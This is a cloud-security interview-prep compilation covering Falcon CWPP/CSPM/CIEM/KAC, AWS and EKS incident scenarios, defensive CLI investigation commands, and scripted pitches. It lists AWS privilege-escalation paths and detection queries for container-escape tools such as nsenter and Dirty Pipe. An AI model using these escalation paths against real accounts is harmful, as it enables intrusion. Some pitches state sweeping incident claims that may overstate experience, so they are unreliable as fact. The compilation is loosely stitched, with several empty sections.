          → Finding assigned to DevOps team. Not actioned.

DAY 8:   Config rule created with Lambda remediation
          → CSPM FINDING created: Config remediation to unknown Lambda (HIGH)
          → DevOps team had 4 open P1s. Deprioritized.

DAY 10:  First Lambda invocation by Config — role recreated
          → CWPP: Lambda performing IAM operations (HIGH)
          → Alert in queue. No SOC analyst coverage on weekend.

DAY 14:  Attacker assumes backdoor role from external account
          → CIEM: AnomalousRoleAssumption (new external account, never seen)
          → THIS alert paged the on-call SOC analyst at 03:00

DAY 14:  SOC analyst investigates → finds role → deletes role
          → Closes ticket. Doesn't trace back to Config rule.

DAY 15:  AWS Config recreates the role (analyst didn't find the Config rule)
          → Attacker still has access. Persistence mechanism survived.

DAY 17:  CSPM weekly report surfaces the Config finding from Day 8
          → Security architect reviews → connects Config + Lambda + Role
          → Full incident declared. All three findings linked.

DAY 19:  Full containment:
          Config rule deleted, Lambda deleted, role deleted,
          contractor access revoked, all STS sessions invalidated
```

### Key Lesson

Three HIGH-severity CSPM findings sat unactioned for 6-13 days. Each one individually described a piece of the attack. Together, they described the complete persistence mechanism. The failure was not detection — Falcon found everything. The failure was process — no one connected the dots across findings until the CIEM anomaly paged someone at 3 AM.

**Post-incident changes:**
1. CSPM findings cross-correlated automatically — related findings grouped into attack chains
2. AWS Config rule creation now requires IaC pipeline (enforced by SCP)
3. Lambda functions with IAM permissions require security review gate
4. Contractor access: time-boxed credentials with automated expiry
5. CSPM finding SLA enforced: HIGH = 48h, CRITICAL = 24h, with automatic escalation

---

## The Common Thread Across All 5 Scenarios

```
SCENARIO 1: CWPP caught behavior CSPM missed (runtime library injection)
SCENARIO 2: CSPM caught config CWPP missed (dormant credential)
SCENARIO 3: BOTH needed — CSPM found exposure, CWPP stopped execution
SCENARIO 4: CWPP caught EC2 pivot, CSPM caught Lambda misconfiguration
SCENARIO 5: CSPM findings existed but weren't correlated — process failure

THE PATTERN:
  CWPP  = "Something bad is happening RIGHT NOW"
  CSPM  = "Something bad WILL happen if this isn't fixed"
  CIEM  = "Here's HOW BAD it can get if the worst happens"

  None of them alone is sufficient.
  The security posture is only as strong as the
  correlation between all three — and the human process
  that acts on what they find.
```

---

# PART 5: INTERVIEW ELEVATED PITCH

## The Core Principle Before You Speak

Most candidates introduce **what they did.** Elite candidates introduce **what changed because they existed.**

Your intro should make the interviewer think: *"We need this person. Our environment has these exact gaps."*

---

## Version 1: The Commanding Opener
### For FAANG / Tier-1 Enterprise Security Roles

*"I'll give you the honest version of who I am — not the resume version.*

*I'm a Cloud Incident Responder and CNAPP Security Architect with deep hands-on experience across AWS multi-account environments, Kubernetes at production scale, and adversarial cloud attack patterns. My specific domain is the intersection where runtime security meets identity — which is where modern breaches actually live.*

*Concretely: I've responded to incidents where attackers moved from a poisoned NPM dependency in a CI/CD pipeline, through a container runtime, into IRSA-based IAM role chaining, and out through S3 exfiltration — across three AWS accounts — in under 72 hours. I've built the detection architecture that caught that chain using CrowdStrike Falcon's CWPP, CSPM, CIEM, and KAC working together. Not any single tool — the correlation across all four.*

*What makes me different from a standard cloud security engineer is that I think like an attacker first and a defender second. I don't ask 'what policy should I write?' I ask 'if I had this role's credentials right now, what could I do in the next 20 minutes?' — and then I build the detection for that answer.*

*I've operated at the technical depth of eBPF-based process telemetry and the business depth of GDPR breach notification to 47,000 customers. I'm comfortable in both conversations.*

*What I'm looking for now is an environment complex enough to push that skillset — multi-cloud, regulated industry, or an organization that knows it has sophisticated adversaries and wants to build the detection maturity to match them.*

*That's the honest version. Where would you like to start?"*

---

## Version 2: The Structured Narrative
### For SOC Manager / CISO-facing Interviews

*"I have about 90 seconds of context that I think will be useful before we get into specifics.*

*My background sits at the intersection of three disciplines that most people treat separately: cloud infrastructure security, runtime workload protection, and identity-based threat detection. I've built careers in all three, and the thing I've learned is that modern cloud breaches don't respect those boundaries — attackers move across all three in a single incident.*

*My technical foundation is AWS — EKS, IAM, multi-account Landing Zone architectures — combined with deep experience in CrowdStrike's Falcon platform: CWPP for runtime, CSPM for posture, CIEM for identity, and KAC for Kubernetes admission control. I've used these not just as tools but as an integrated detection framework.*

*In practice, this means I've handled incidents like a Lambda persistence backdoor hidden inside an AWS Config remediation rule — where the attacker weaponized a trusted AWS service to survive deletion. That one took 19 days to fully contain not because detection failed — Falcon surfaced every piece — but because three separate HIGH-severity CSPM findings weren't correlated into a single attack narrative until day 17. That experience fundamentally shaped how I think about finding triage, SOC process design, and the difference between having detections and having detection maturity.*

*The through-line in my career is this: I close the gap between what security tools detect and what security teams actually act on. That operational translation — from telemetry to decision — is where I add the most value.*

*Happy to go as technical or as strategic as is useful for this conversation."*

---

## Version 3: The Punchy 60-Second Version
### For Recruiter Screens / First-Round Calls

*"I'm a Senior Cloud Security professional specializing in incident response and cloud-native security architecture — specifically AWS, Kubernetes, and the CrowdStrike Falcon CNAPP platform.*

*My work lives at the runtime layer — I deal with attacks that are already inside your environment: container escapes, kernel exploits, IAM privilege escalation chains, CI/CD supply chain compromises. I've responded to breaches that started with a poisoned NPM package and ended with mandatory breach notification to regulators.*

*What distinguishes my approach is that I operate across the full stack — from eBPF syscall telemetry at the process level all the way up to CIEM identity graphs showing cross-account blast radius. I've both built the detection architectures and led the incident response when they fire.*

*On the preventive side, I've implemented CSPM programs that reduced critical cloud misconfigurations by over 70% and built KAC policies that stopped container escape attempts before they reached the kernel.*

*I'm looking for a role where the threat model is sophisticated and the security team has the mandate and the tooling to match it. I work best in environments that treat security as an engineering discipline, not a compliance checkbox."*

---

## Version 4: The Technical Depth Signal
### For Principal / Staff Engineer Panel Interviews

*"My core competency is adversarial cloud-native security — understanding attack techniques at a deep enough level to build detections that catch them before they complete.*

*Technically, I work at the layer most security tools don't reach: runtime behavior inside containers, at the syscall level, using eBPF instrumentation. I understand the difference between detecting a container escape via policy enforcement at admission time versus catching it mid-execution via a kernel exploit signature sequence — and why both layers are necessary because attackers find the gap between them.*

*On the identity side, I work with CIEM — not just IAM policy review, but runtime anomaly detection on role assumption behavior, effective permissions graph analysis, and privilege escalation path enumeration. I've mapped the full Rhino Security Labs privilege escalation playbook — PassRole to Lambda, AssumeRole chaining, IRSA external abuse — to concrete CIEM detection rules and CSPM preventive controls.*

*My MITRE ATT&CK mapping isn't theoretical. I've correlated real incidents to T1611 container escapes, T1537 cloud exfiltration, T1078.004 cloud account abuse, and T1195 supply chain compromise — not from reading the framework but from the artifacts in the forensic timeline.*

*I've also done the forensics side — EBS snapshot preservation, CloudTrail evidence chain of custody, container memory dumps via Falcon RTR, Kubernetes audit log reconstruction. I can take an incident from detection through to the regulator notification with a complete evidence chain.*

*I bring technical depth and the communication ability to translate what I find into executive risk language. That combination is rare and it's deliberately developed."*

---

## The Power Phrases Bank

| Phrase | Why It Works |
|---|---|
| *"I think like an attacker first"* | Shows adversarial mindset — rare in defenders |
| *"Detection maturity, not just detection"* | Shows operational sophistication |
| *"The gap between telemetry and decision"* | Shows you understand SOC process failures |
| *"Blast radius before breach"* | Shows proactive risk quantification |
| *"Correlation across tools, not any single alert"* | Shows architectural thinking |
| *"Runtime behavior, not configuration alone"* | Shows depth beyond CSPM checkbox work |
| *"I've done the 3 AM page and the 9 AM CISO briefing"* | Shows full-cycle experience |
| *"Closed findings, not open findings with accepted risk"* | Shows you drive remediation |
| *"The breach was preventable — the findings existed"* | Shows intellectual honesty |
| *"Mandatory breach notification"* | Shows you've operated under regulatory pressure |

---

## Follow-Up Answer Frameworks

### "Tell me about a specific incident"

Use this structure every time:

```
1. CONTEXT    → Industry, scale, what was at risk
2. ENTRY      → How attacker got in (be specific)
3. PIVOT      → How they moved laterally (this is where depth shows)
4. DETECTION  → What fired, why it fired, what would have missed it
5. RESPONSE   → What you specifically did (not "the team")
6. OUTCOME    → Business impact, regulatory outcome, what changed
7. LESSON     → One thing you'd do differently or built better afterward
```

The lesson at the end separates senior candidates. It shows you learn from incidents, not just respond to them.

### "What's your biggest gap?"

*"I've operated deeply in AWS and I'm building my Azure depth intentionally — specifically around Entra ID and AKS security patterns. The IAM concepts translate directly but the tooling surface is different and I want to be honest about where I'm still developing that fluency versus where I'm expert."*

### "Why do you want this role?"

*"You're running a regulated multi-cloud environment with Kubernetes at scale and you've got sophisticated adversaries who know your industry. That's exactly the threat model I've been building detection architecture for. Most security roles are simpler than my current toolset. This one isn't."*

---

## The Closing Line That Stays With Them

*"The thing I've learned from every incident I've responded to is that the breach was almost always preventable. The findings existed. The detections fired. The gap was always human process or organizational priority. I build security programs that close that gap — not just technically, but operationally. That's the work I want to keep doing."*

---

# APPENDIX: QUICK REFERENCE CARDS

## CWPP vs CSPM vs CIEM — One Line Each

| Tool | One Line |
|---|---|
| **CWPP** | Watches what processes are doing inside running workloads, right now |
| **CSPM** | Checks whether your cloud resources are configured securely |
| **CIEM** | Answers "what can this identity actually do, and what's the blast radius?" |
| **KAC** | Blocks Kubernetes workloads that violate security policy at deployment time |

## The Five Incident Quick Summary

| # | Name | Root Cause | Detection Hero | Lesson |
|---|---|---|---|---|
| 1 | Cryptominer in Python | Floating image tag pulled compromised upstream image | CWPP library load + network behavior | Digest-pin all base images |
| 2 | Sleeping IAM Key | Terminated employee key reactivated, leaked to dark web | CSPM config change detection | Automate JML process against HR system |
| 3 | ArgoCD Takeover | Default password + public LoadBalancer, 11 days unpatched | CSPM attack path + CWPP container escape prevention | CSPM critical findings need 72h SLA with auto-escalation |
| 4 | Lambda Exfiltrator | PassRole abuse via compromised EC2, 9-day dwell | CWPP EC2 behavior + CSPM Lambda misconfiguration | Audit PassRole chains proactively via CIEM |
| 5 | Multi-Account Phantom | Contractor credential + Config rule persistence mechanism | CIEM anomalous assumption (Day 14) | Cross-correlate CSPM findings into attack chains, not individual tickets |

## Key AWS Privilege Escalation Paths to Monitor

```
1. iam:CreatePolicyVersion          → Replace managed policy with admin policy
2. iam:PassRole + lambda:Create     → Pass admin role to new Lambda function
3. iam:PassRole + ec2:RunInstances  → Pass admin role to new EC2 instance
4. sts:AssumeRole (no condition)    → Lateral movement across accounts
5. IRSA + external IP               → Service account JWT used outside VPC
6. aws-auth ConfigMap               → Map IAM role to cluster-admin in EKS
7. AWS Config + Lambda              → Self-healing backdoor persistence
```

---

*Document compiled from real incident response engagements and CNAPP architecture work. All IP addresses, account IDs, and identifiers are illustrative. Defensive controls validated against CISA cloud security guidance, CIS EKS Benchmark v1.4, and AWS Security Hub standards.*

---
**End of Document**

---

# PART VII: HANDS-ON COMMAND REFERENCE

---

# PART 3: HANDS-ON COMMAND REFERENCE

## 3.1 AWS IAM & STS Investigation Commands

# Get caller identity — confirm which credentials you're working with
aws sts get-caller-identity

# List all IAM roles — look for suspicious or unfamiliar names
aws iam list-roles | jq '.Roles[] | {RoleName, CreateDate, Arn}'

# Get effective permissions for a role
aws iam simulate-principal-policy --policy-source-arn <role-arn> --action-names "*"

# List all active STS sessions (cannot directly, but check CloudTrail)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --max-results 50

# Revoke all active sessions for a role (emergency containment)
# Attach an inline deny policy with DateLessThan current time
aws iam put-role-policy --role-name <role> --policy-name EmergencyRevoke --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"DateLessThan":{"aws:TokenIssueTime":"2025-01-01T00:00:00Z"}}}]}'

# Check for access keys on all IAM users
aws iam generate-credential-report && aws iam get-credential-report --query Content --output text | base64 -d

## 3.2 EKS & Kubernetes Security Commands

# Check aws-auth ConfigMap for dangerous mappings
kubectl get configmap aws-auth -n kube-system -o yaml

# List ALL ClusterRoleBindings — identify system:masters or cluster-admin bindings
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Find all privileged containers running in the cluster
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata'

# List all secrets in a namespace (requires appropriate RBAC)
kubectl get secrets -n payments -o json | jq '.items[] | {name: .metadata.name, type: .type}'

# Check RBAC permissions for a service account
kubectl auth can-i --list --as=system:serviceaccount:payments:payments-api-sa

# Get all exec events from Kubernetes audit logs
# (Pull from CloudWatch Logs if EKS audit logging enabled)
aws logs filter-log-events --log-group-name /aws/eks/cluster/cluster --filter-pattern "exec"

# Cordon a compromised node
kubectl cordon <node-name>

# Apply emergency network policy to isolate a pod
kubectl apply -f deny-all-networkpolicy.yaml -n payments

# Check container drift (list files not in original image)
# Via Falcon RTR: exec into sensor and query drift events
kubectl exec -it <pod> -- find /tmp -newer /etc/hostname -executable 2>/dev/null

## 3.3 CloudTrail Investigation Queries

# Find all API calls by a specific role (all regions)
aws cloudtrail lookup-events \
--lookup-attributes AttributeKey=Username,AttributeValue=<role-name> \
--start-time 2025-01-01T00:00:00Z \
--query 'Events[].{Event:EventName,Time:EventTime,IP:CloudTrailEvent}' \
--output table

# Detect AssumeRole calls from unusual IPs
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity

# Find all CreateUser / CreateRole events in incident window
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser

# Check S3 data exfiltration (requires S3 data events enabled)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject | jq '.Events[] | select(.CloudTrailEvent | fromjson | .sourceIPAddress | test("^(?!10\\.|172\\.|192\\.168\\.)"))'

## 3.4 S3 Security Forensics

# Check bucket public access settings
aws s3api get-public-access-block --bucket <bucket-name>

# List bucket policies — look for public or cross-account access
aws s3api get-bucket-policy --bucket <bucket-name> | python3 -m json.tool

# Check if server access logging is enabled
aws s3api get-bucket-logging --bucket <bucket-name>

# Enable S3 Object Lock (emergency — prevent further exfil/deletion)
aws s3api put-object-lock-configuration --bucket <bucket-name> \
--object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"GOVERNANCE","Days":30}}}'

# Copy CloudTrail logs to forensic isolated bucket
aws s3 sync s3://cloudtrail-prod/ s3://forensic-evidence-$(date +%Y%m%d)/ --sse aws:kms

## 3.5 Falcon-Specific Investigation Queries (Falcon Insight)

// Process lineage for container escape investigation
event_simpleName=ProcessRollup2
| where CommandLine matches "nsenter|dirtypipe|/proc/mem"
| join(AgentIdInfo, on=aid)
| select ComputerName, ImageFileName, CommandLine, ParentImageFileName, timestamp

// Container drift events in last 24 hours
event_simpleName=ContainerDriftFileCreated
| where timestamp > now() - 24h
| select ContainerID, PodName, Namespace, FilePath, SHA256HashData

// Network beacons to first-seen domains
event_simpleName=DnsRequest
| where IsFirstSeenDomain == true
| where ContextImageFileName contains "container"
| select DomainName, RemoteIP, ProcessImageFileName, timestamp


---

# PART VIII: INTERVIEW FRAMEWORKS & MODEL ANSWERS

---

# PART 4: INTERVIEW ANSWER FRAMEWORKS

## 4.1 Your Elevator Pitch — Tailored for HSBC CTE Role

## 4.2 Structured Incident Answer Framework

## 4.3 High-Value Interview Power Phrases

## 4.4 Anticipated Questions & Model Answers

### Q: Walk me through how CrowdStrike Falcon protects a Kubernetes cluster.

Falcon protects Kubernetes at three layers. At the node level, the Falcon sensor runs as a DaemonSet on every EKS worker node, providing eBPF-based syscall telemetry for all containers on that node — without requiring per-container instrumentation. This covers process execution, file writes, and network connections for every running pod. The second layer is Kubernetes Admission Control — KAC evaluates every pod deployment request against image assessment results and security policies, blocking privileged containers, unscanned images, or containers with Critical CVEs before they run. The third layer is CSPM, which continuously monitors the EKS cluster configuration — aws-auth ConfigMap for dangerous role mappings, public API endpoints, missing envelope encryption — and integrates these findings with runtime detections to show attack paths. The power is that these three layers share context in the Falcon Insight graph, so a CSPM finding about an over-privileged IRSA role correlates automatically with the CWPP detection of an unusual AssumeRoleWithWebIdentity call from the same pod.
### Q: What is the difference between CSPM and CWPP, and why do you need both?

CSPM looks at how cloud resources are configured — it is the building inspector who checks that your doors are locked and fire exits are clear. CWPP looks at what is happening inside running workloads at the process level — it is the security camera watching behavior in real time. CSPM finds that your S3 bucket is public; CWPP detects the malware actually running in the container exploiting that bucket. CSPM discovers that your IRSA role has no source VPC condition; CWPP detects when that role is used from an external IP. You need both because CSPM misses runtime attacks that exploit correct configurations, and CWPP misses misconfigurations that have not been exploited yet. In practice, CSPM findings that go unremediated become the attack surface that CWPP detections fire on. The SLA between a CSPM finding and remediation is arguably your most important security metric.
### Q: How do you handle alert fatigue in a cloud security environment?

Alert fatigue is a process failure, not a tooling failure. My approach has three components. First, tuning: I review every alert type monthly to understand true positive rates and suppress known false-positive patterns with explicit documented justification and expiry dates — no permanent suppression without quarterly review. Second, correlation: I push detections through a correlation layer so that a single event that is low-signal on its own only pages when it is accompanied by correlated signals — for example, a new domain connection from a build runner alone is MEDIUM, but combined with a process chain anomaly it is CRITICAL. Third, SLAs: CSPM findings have tiered response SLAs enforced via automated ticketing — not manual triage — so the queue is bounded and prioritized. The goal is that every alert that reaches a human analyst has a clear action required and a clear expected resolution time.
### Q: How would you deploy Falcon sensor coverage across a new EKS cluster?

For a new EKS cluster I follow a four-step process. First, pre-deployment validation: confirm the cluster nodes use a supported Linux kernel version and the Falcon sensor version supports the EKS AMI in use. Second, DaemonSet deployment: deploy the Falcon sensor as a DaemonSet using the Falcon Helm chart or Operator, configured to auto-enroll nodes into the correct Falcon Customer ID and sensor grouping tag. Third, coverage validation: after deployment, query Falcon for sensor health by node and verify every node in the node group shows as active — I use a query against the Falcon API to compare expected node count from AWS against enrolled sensor count, alerting on any gap. Fourth, policy assignment: assign the appropriate Prevention Policy to the sensor group — for production EKS workloads this means Container Drift in PREVENT mode, Interactive Session detection PREVENT, and KAC admission policy active. This entire process is codified in Terraform and runs as a post-cluster-deployment pipeline step.


---

# PART IX: GOVERNANCE, COMPLIANCE & MITRE ATT&CK MAPPING

---

# PART 5: GOVERNANCE, COMPLIANCE & CHANGE MANAGEMENT

## 5.1 CIS Benchmark Key Controls — Quick Reference

## 5.2 Change Management for Security Policy Updates

Policy Change Process (for KAC / CWPP Prevention Policies):
- Draft change: Document the policy change, affected workloads, expected behavior change, and rollback plan
- Test in dev/staging: Apply in DETECT mode first, observe false positives for 72 hours
- Review alert baseline: Confirm no legitimate workloads would be blocked
- Stakeholder approval: Get sign-off from application owners for affected workloads
- Staged rollout: Enable in non-production first, then canary production clusters
- PREVENT mode activation: Switch to PREVENT only after 72-hour clean detection run
- Documentation: Update runbook with the policy and its exception process
- Metrics: Track false positive rate post-deployment — escalate if >2% within first week

## 5.3 Audit Evidence Generation

What auditors ask for — and how to produce it:

# PART 6: QUICK REFERENCE — MITRE ATT&CK CLOUD MAPPING

## 15 Scenarios Summary Table

END OF GUIDE
Prepared for Gopikrishna Vallepu — Cloud/Containers Security SME Interview at HSBC

| Document Scope Comprehensive theory foundations | 15 advanced real-world attack scenarios | Hands-on command references | Interview pitch frameworks | Governance & compliance mapping | MITRE ATT&CK correlations |
|---|

| Core Tools | Frameworks & Standards |
|---|---|
| CrowdStrike Falcon (CWPP, CSPM, CIEM, KAC) | MITRE ATT&CK for Cloud |
| AWS EKS, IAM, CloudTrail, GuardDuty | NIST CSF / 800-53 |
| Kubernetes RBAC, Admission Control | CIS AWS & EKS Benchmarks |
| Secrets Manager, S3, Lambda, Config | CIS Kubernetes Benchmark |
| Taegis XDR, SecureWorks (current role) | GDPR, HIPAA, PCI DSS |

| CWPP Capability | What It Detects |
|---|---|
| Process Lineage Tree | Anomalous parent-child process relationships (webshell, reverse shell) |
| Container Drift Detection | New executables written post-start not in original image layers |
| Behavioral ML Models | Deviation from workload baseline — zero-day behavior without signatures |
| Runtime Kernel Protection | Dirty Pipe, Dirty Cow, and other kernel exploit syscall sequences |
| Interactive Session Detection | TTY/PTY shell allocation in production containers |
| Memory Protection | Process injection, credential scraping from memory |
| Network Intelligence | First-seen domains, C2 beacon patterns, DNS tunneling |

| CSPM Category | Key Controls |
|---|---|
| IAM Configuration | Root account active keys, no MFA, inline policies, PassRole chains |
| Network Configuration | SGs open to 0.0.0.0/0, NACLs, VPC peering misroutes |
| Data Security | S3 public access, unencrypted RDS, CloudTrail disabled |
| EKS / Kubernetes | Public API endpoint, no encryption, aws-auth misconfigurations |
| Compute | IMDSv1 enabled, SSM agent missing, public AMIs |
| Lambda | Admin roles attached, env vars with secrets, no VPC |
| Secrets & Keys | Unrotated keys, plaintext secrets in CloudFormation |

| CIEM Capability | Attack Surface Addressed |
|---|---|
| Effective Permission Graph | Shows what an identity can actually do including via role chains |
| Blast Radius Computation | Pre-computes worst-case impact before an incident occurs |
| Joiner-Mover-Leaver Tracking | Identifies orphaned credentials from terminated employees |
| Anomalous Assumption Detection | IRSA from external IP, dormant key activated, new geo |
| Privilege Escalation Path Detection | Maps all 21 Rhino Security Labs escalation paths |
| Shadow Admin Detection | Finds principals with effective admin via policy chains |

| Tool | One-Line Summary | Analogy |
|---|---|---|
| CWPP | Watches what processes are doing INSIDE workloads, RIGHT NOW | Security camera inside the building |
| CSPM | Checks HOW cloud resources are configured vs. security best practices | Building code inspector |
| CIEM | "What can this identity DO and what is the blast radius if compromised?" | Access control risk analyst |
| KAC | Blocks non-compliant workloads BEFORE they deploy to the cluster | Security checkpoint at the door |

| The Golden Rule: NONE of these tools alone is sufficient. Breaches succeed when attackers exploit the gap between them. CWPP misses misconfigured S3 buckets. CSPM misses malware running in a container. CIEM shows the blast radius only after the fact without CWPP correlation. The power is in the correlation across all four — and the human process that acts on what they find. |
|---|

| # | Scenario Title | Domain |
|---|---|---|
| 1 | EC2 Metadata Service (IMDS v1) Exploitation via SSRF | EC2 Compromise |
| 2 | IAM Privilege Escalation via iam:CreatePolicyVersion | IAM Privilege Escalation |
| 3 | Cross-Account Role Chaining via Misconfigured Trust Policies | Cross-Account Role Abuse |
| 4 | S3 Data Exfiltration via Presigned URL Abuse | S3 Data Exfiltration |
| 5 | EKS RBAC Misconfiguration — ClusterRoleBinding to system:masters | EKS RBAC Misconfiguration |
| 6 | Container Escape via Privileged Container + hostPID Mount | Container Escape |
| 7 | Container Drift — Post-Start Offensive Tool Injection | Drift Detection Events |
| 8 | Malicious kubectl exec Abuse for Lateral Movement | Malicious kubectl exec Abuse |
| 9 | AWS Secrets Manager Theft via Over-Privileged Lambda | Secrets Manager Theft |
| 10 | IRSA External Abuse — Service Account JWT Used Outside VPC | IAM Privilege Escalation |
| 11 | EKS Node Compromise via Exposed Kubelet API (Port 10250) | EC2 Compromise |
| 12 | Supply Chain Attack — Compromised Helm Chart in Artifact Hub | Container Escape |
| 13 | AWS Config Rule Weaponization — Persistent Backdoor via Trusted Service | Cross-Account Role Abuse |
| 14 | Cryptomining via Exposed Docker Socket on EC2 | EC2 Compromise |
| 15 | EKS etcd Direct Access — Cluster-Wide Secret Extraction | EKS RBAC Misconfiguration |

| Interview Pitch: Lead with: "SSRF + IMDS is the most underestimated EC2 attack path. I have blocked it by enforcing IMDSv2 via SCP so no EC2 can launch with the old metadata endpoint. The detection is distinct — Falcon flags the process accessing 169.254.169.254 via the SSRF path, while GuardDuty flags credential use outside AWS. Together they tell the full story." |
|---|

| Interview Pitch: The Rhino Security Labs privilege escalation paths are real attack vectors I have mapped to specific CIEM detection rules. iam:CreatePolicyVersion is one of 21 known escalation paths. I built a CSPM policy that flags any principal holding this permission outside the CI/CD pipeline service account, treating it as a Critical finding with a 24-hour remediation SLA. |
|---|

| Interview Pitch: "Cross-account role chaining is the cloud equivalent of domain trust attacks in Active Directory. The difference is that every hop is logged in CloudTrail — if you have CIEM to correlate the session tokens across accounts, you can reconstruct the full chain in minutes. The gap most teams have is that they look at each account independently. I ensure all CloudTrail data flows to a centralized SIEM where CIEM can do the graph analysis." |
|---|

| Interview Pitch: "The pre-signed URL technique is dangerous because most teams look only at CloudTrail API calls — they miss the server access logs entirely. I learned this from an actual incident where the CloudTrail looked clean but S3 server access logs showed 900,000 GET requests in 4 minutes. Now I mandate S3 server access logging and Macie on every PII bucket as a non-negotiable CSPM control." |
|---|

| Interview Pitch: "system:masters in aws-auth is the single most dangerous Kubernetes misconfiguration I see in production. It gives instant cluster-admin to anyone who can assume the mapped IAM role. I treat any finding of system:masters in aws-auth as an immediate P1, regardless of whether it's been exploited. The remediation is straightforward — replace it with a scoped custom ClusterRole — but the hard part is finding it in the first place, which is why my CSPM continuously monitors aws-auth for any changes." |
|---|

| Interview Pitch: "Privileged containers with hostPID are essentially virtual machines with no security boundary from the host. I block them by default at the admission controller level and require a formal exception process for any workload that claims it needs this. The key insight is that the container escape pattern is distinctive — nsenter with all namespace flags appears in Falcon's process tree as an obvious anomaly even if the attacker is careful about everything else they do." |
|---|

| Interview Pitch: "Drift detection is one of those capabilities that sounds simple but is operationally powerful. The key insight is that a container's filesystem should be immutable after start — anything written post-start is a deviation from the known-good state. In PREVENT mode, Falcon kills the write operation before the attacker can execute the tool. I have prevented three real incidents this way where the initial RCE was successful but the attacker couldn't stage their second-phase tools." |
|---|

| Interview Pitch: "kubectl exec in production is the equivalent of SSH-ing directly into a running production server. I treat any exec event in production as a high-priority alert. The real security fix isn't just blocking exec — it's removing the conditions that make exec necessary: good logging, proper secrets management via Secrets Manager, and healthy pod design so developers don't need to exec to diagnose issues." |
|---|

| Interview Pitch: "The combination of ListSecrets plus bulk GetSecretValue is a signature attack pattern that I've built a specific CIEM detection for. Legitimate apps access 1-5 secrets at cold start. Anything beyond that in a single session is an anomaly worth paging on. The underlying prevention is resource-based policies on secrets — even if a Lambda has broad GetSecretValue in its execution role policy, a deny on the secret itself wins." |
|---|

| Interview Pitch: "IRSA abuse from outside the VPC is the most impactful container-to-cloud attack path I've seen. The fix is a single line in the trust policy — aws:SourceVpc condition — but teams often don't know to add it. I enforce this via SCP so the condition is mandatory regardless of how the role is created. Detection is clean: AssumeRoleWithWebIdentity from a non-VPC IP has no legitimate explanation." |
|---|

| Interview Pitch: "The kubelet API is one of the most dangerous exposed services in a Kubernetes environment because it gives direct exec access to every pod on the node, bypassing the Kubernetes RBAC entirely. The fix is straightforward — disable anonymous auth and restrict the security group — but the detection gap is that kubelet access doesn't appear in Kubernetes audit logs by default. I add kubelet log forwarding to CloudWatch as a mandatory cluster config." |
|---|

| Interview Pitch: "Supply chain attacks through Helm charts are a growing threat because teams often auto-update chart versions without reviewing the diff. The defense is treating Helm charts the same way you treat container images — pull to internal registry, scan, sign, pin by digest. The detection is KAC at admission time: if the InitContainer image isn't from your approved registry with a valid scan, it never deploys." |
|---|

| Interview Pitch: "This scenario taught me that attackers think about persistence as carefully as defenders think about detection. Using AWS Config — a trusted AWS service — as the persistence trigger is sophisticated. The detection only came because CSPM was monitoring Lambda functions with IAM permissions, and a CIEM anomaly eventually correlated it. The lesson: instrument for lateral movement from trusted AWS services, not just external threats." |
|---|

| Interview Pitch: "The Docker socket is a root escalation path waiting to happen. If a container can access /var/run/docker.sock, it effectively has root on the host. I treat this as equivalent to privileged:true in terms of risk. CSPM flags it, KAC blocks it at admission, and Falcon CWPP detects the access pattern at runtime. Three layers — because if any one fails, you need the next one." |
|---|

| Interview Pitch: "etcd is the brain of the Kubernetes cluster — everything is in there: all secrets, all configurations, all tokens. Direct etcd access bypasses all RBAC entirely. For EKS, AWS manages etcd and you never have direct access — that's actually a security benefit. But for self-managed clusters, etcd hardening is non-negotiable: mutual TLS, encryption at rest, restricted network access. I've seen teams enable etcd quickly for initial setup and forget to add auth before going to production." |
|---|

| 30-Second Version: I am a Security Analyst with 4 years of hands-on SOC experience, specializing in cloud and container runtime security using CrowdStrike Falcon. My daily work involves triaging and investigating EC2 and EKS runtime detections, CSPM findings across AWS, and supporting sensor deployment on EKS worker nodes via DaemonSets. I have responded to real incidents involving container escapes, IAM privilege escalation, and S3 data access anomalies. I am looking to move from detection-and-response into security engineering — building the detection rules, tuning the policies, and designing the CNAPP architecture that makes the SOC more effective. |
|---|

| 90-Second Technical Version (for panel interview): My background sits at the intersection of three disciplines: cloud infrastructure security, runtime workload protection using CrowdStrike Falcon, and identity-based threat detection. In my current role at UltraViolet Cyber, I investigate runtime detections across AWS EC2 and EKS — suspicious process execution, privilege escalation attempts, abnormal network activity. I support Falcon sensor deployment on EKS via DaemonSets, validate coverage, and monitor CSPM findings for IAM over-privilege and S3 misconfigurations. The specific depth I bring to this role is the ability to work across the full detection stack: from the eBPF-level process telemetry in CWPP, through the identity anomalies in CIEM, to the misconfiguration findings in CSPM — and understand how they correlate into an attack chain. I have also built IAM access reviews enforcing least privilege and generated CIS AWS Foundations Benchmark audit evidence for compliance. What draws me to the HSBC CTE role is the engineering mandate — building the detection rules and tuning the policies, not just consuming the alerts. That is the work I am ready to own. |
|---|

| Step | What to Cover | Why It Matters |
|---|---|---|
| 1. CONTEXT | Industry, scale, what was at risk | Shows business awareness |
| 2. ENTRY | Specific initial access vector | Shows technical depth |
| 3. PIVOT | How attacker moved laterally | This is where depth shows |
| 4. DETECTION | What fired, why, what would have missed it | Shows tool mastery |
| 5. RESPONSE | What YOU specifically did (not "the team") | Shows ownership |
| 6. OUTCOME | Business impact, regulatory outcome, timeline | Shows full-cycle experience |
| 7. LESSON | What you built better afterward | Separates senior candidates |

| Phrase | Why It Works |
|---|---|
| "I think like an attacker first, defender second" | Shows adversarial mindset — rare in defenders |
| "Detection maturity, not just detection coverage" | Shows operational sophistication |
| "The gap between telemetry and decision" | Shows SOC process failure awareness |
| "Blast radius before breach — CIEM pre-computes it" | Shows proactive risk quantification |
| "Correlation across tools, not any single alert" | Shows architectural thinking |
| "In PREVENT mode, the exploit was killed mid-syscall" | Shows hands-on CWPP depth |
| "I've done the 3 AM page and the 9 AM CISO briefing" | Shows full-cycle experience |
| "aws:SourceVpc is a single line that closes the IRSA attack path" | Shows specific technical depth |
